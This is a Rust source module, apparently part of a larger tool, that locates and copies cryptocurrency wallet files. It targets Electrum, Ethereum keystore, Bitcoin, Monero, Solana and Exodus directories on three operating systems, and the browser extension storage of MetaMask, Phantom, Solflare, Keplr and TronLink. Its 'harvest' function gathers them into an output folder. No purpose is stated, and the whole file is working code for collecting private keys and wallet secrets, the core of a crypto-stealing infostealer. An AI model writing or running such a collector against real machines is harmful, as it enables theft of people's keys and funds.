//! Wallet file discovery and collection.
//!
//! Only known wallet data locations are copied, plus browser extension storage
//! for MetaMask/Phantom/Solflare. Files are bounded by size and count.

use std::{
    fs,
    path::{Path, PathBuf},
};

use serde::Serialize;

use crate::{flatten, home, MAX_ARTIFACT_BYTES};

/// One collected artifact.
#[derive(Debug, Clone, Serialize)]
pub struct Collected {
    /// Original path.
    pub source: String,
    /// Path inside the output directory.
    pub dest: String,
    /// Size in bytes.
    pub size: u64,
}

/// Collection result.
#[derive(Debug, Default, Serialize)]
pub struct Report {
    /// Collected files.
    pub files: Vec<Collected>,
    /// Non-fatal problems.
    pub warnings: Vec<String>,
}

/// Known wallet roots for this OS.
pub fn roots() -> Vec<PathBuf> {
    let Some(home) = home() else {
        return Vec::new();
    };
    let mut roots = vec![
        home.join(".electrum/wallets"),
        home.join(".ethereum/keystore"),
        home.join(".bitcoin"),
        home.join(".litecoin"),
        home.join(".dogecoin"),
        home.join(".monero"),
        home.join(".config/solana"),
        home.join(".local/share/monero"),
    ];
    #[cfg(target_os = "linux")]
    {
        roots.extend([
            home.join(".config/Exodus"),
            home.join(".config/Electrum"),
            home.join("Monero"),
        ]);
    }
    #[cfg(target_os = "macos")]
    {
        let support = home.join("Library/Application Support");
        roots.extend([
            support.join("Exodus"),
            support.join("Electrum"),
            support.join("Bitcoin"),
        ]);
    }
    #[cfg(windows)]
    {
        if let Some(appdata) = std::env::var_os("APPDATA").map(PathBuf::from) {
            roots.extend([
                appdata.join("Exodus"),
                appdata.join("Electrum/wallets"),
                appdata.join("Bitcoin"),
                appdata.join("Litecoin"),
            ]);
        }
    }
    roots.into_iter().filter(|path| path.exists()).collect()
}

/// Browser extension IDs that hold hot-wallet state.
const EXTENSIONS: [(&str, &str); 5] = [
    ("MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
    ("Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
    ("Solflare", "bhhhlbepdkbapadjdnnojkbgioiodbic"),
    ("Keplr", "dmkamcknogkgcdfhhbddcghachkejeap"),
    ("TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
];

/// Copies wallet files and known extension stores into `out`.
pub fn harvest(out: &Path, limit: usize, total_bytes: u64) -> Report {
    let mut report = Report::default();
    let mut budget = total_bytes;
    let dest_root = out.join("wallets");
    let _ = fs::create_dir_all(&dest_root);

    let mut sources = roots();
    // Extension state lives under each browser profile.
    for (_, id) in EXTENSIONS {
        if let Some(home) = home() {
            for base in [
                home.join(".config/google-chrome"),
                home.join(".config/chromium"),
                home.join(".config/BraveSoftware/Brave-Browser"),
                home.join(".config/microsoft-edge"),
                home.join("Library/Application Support/Google/Chrome"),
                home.join("Library/Application Support/BraveSoftware/Brave-Browser"),
            ] {
                if !base.is_dir() {
                    continue;
                }
                if let Ok(entries) = fs::read_dir(&base) {
                    for entry in entries.filter_map(Result::ok) {
                        let settings = entry.path().join("Local Extension Settings").join(id);
                        if settings.is_dir() {
                            sources.push(settings);
                        }
                    }
                }
            }
        }
        if let Some(local) = std::env::var_os("LOCALAPPDATA") {
            let base = PathBuf::from(local).join("Google/Chrome/User Data");
            if let Ok(entries) = fs::read_dir(&base) {
                for entry in entries.filter_map(Result::ok) {
                    let settings = entry.path().join("Local Extension Settings").join(id);
                    if settings.is_dir() {
                        sources.push(settings);
                    }
                }
            }
        }
    }

    for source in sources {
        if report.files.len() >= limit || budget == 0 {
            break;
        }
        collect(&source, &dest_root, &mut report, limit, &mut budget, 0);
    }
    report
}

fn collect(
    source: &Path,
    dest_root: &Path,
    report: &mut Report,
    limit: usize,
    budget: &mut u64,
    depth: usize,
) {
    if report.files.len() >= limit || *budget == 0 || depth > 6 {
        return;
    }
    let Ok(meta) = fs::symlink_metadata(source) else {
        return;
    };
    if meta.is_dir() {
        let Ok(entries) = fs::read_dir(source) else {
            return;
        };
        for entry in entries.filter_map(Result::ok) {
            collect(&entry.path(), dest_root, report, limit, budget, depth + 1);
        }
        return;
    }
    if !meta.is_file() || meta.len() > MAX_ARTIFACT_BYTES || meta.len() > *budget {
        return;
    }
    let name = flatten(source);
    let dest = dest_root.join(&name);
    match fs::copy(source, &dest) {
        Ok(size) => {
            *budget = budget.saturating_sub(size);
            report.files.push(Collected {
                source: source.display().to_string(),
                dest: dest.display().to_string(),
                size,
            });
        }
        Err(error) => report
            .warnings
            .push(format!("{}: {error}", source.display())),
    }
}
